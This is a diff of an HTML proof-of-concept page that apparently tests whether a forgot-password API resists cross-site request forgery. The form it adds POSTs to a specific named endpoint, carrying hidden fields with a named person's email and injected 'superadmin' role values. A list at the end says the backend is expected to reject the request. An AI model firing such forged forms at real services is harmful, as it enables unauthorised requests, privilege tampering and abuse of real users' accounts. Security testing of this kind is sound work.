@@ -7,22 +7,31 @@
 
 <h1>🔐 CSRF Demo - Forgot Password</h1>
 
-<p>This simulates an attacker trying to trigger forgot password.</p>
+<p>This simulates a malicious site attempting to trigger a forgot password request.</p>
 
-<button onclick="launchAttack()">🚨 Trigger CSRF Attack</button>
-
-<form id="csrfForm"
-      action="https://grow-uat.fareye.co/api/tenant/merchants/forgot-password"
-      method="POST"
-      style="display:none;">
+<!-- Direct form submission (no JS required → CSP safe) -->
+<form action="https://grow-uat.fareye.co/api/tenant/merchants/forgot-password" method="POST">
+  
+  <!-- Payload -->
   <input type="hidden" name="email" value="anandita.sharma@getfareye.com">
+
+  <!-- Extra fields (if backend expects them) -->
+  <input type="hidden" name="tenant" value="couriersplease">
+  <input type="hidden" name="userType" value="superadmin">
+  <input type="hidden" name="role" value="superadmin">
+
+  <button type="submit">🚨 Trigger CSRF Attack</button>
 </form>
 
-<script>
-function launchAttack() {
-  document.getElementById("csrfForm").submit();
-}
-</script>
+<hr>
+
+<h3>Expected Result:</h3>
+<ul>
+  <li>Request is sent from browser ✔️</li>
+  <li>Cookies (session) are included ✔️</li>
+  <li>But CSRF token is missing ❌</li>
+  <li><strong>Backend rejects request ✅</strong></li>
+</ul>
 
 </body>
 </html>
